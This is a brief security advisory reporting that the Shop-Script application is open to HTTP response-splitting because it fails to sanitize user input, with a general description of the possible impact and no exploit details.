Shop-Script is prone to multiple HTTP response-splitting vulnerabilities because the application fails to properly sanitize user-supplied input.

A remote attacker may exploit this vulnerability to influence or misrepresent how web content is served, cached, or interpreted. This could aid in various attacks that attempt to entice client users into a false sense of trust.
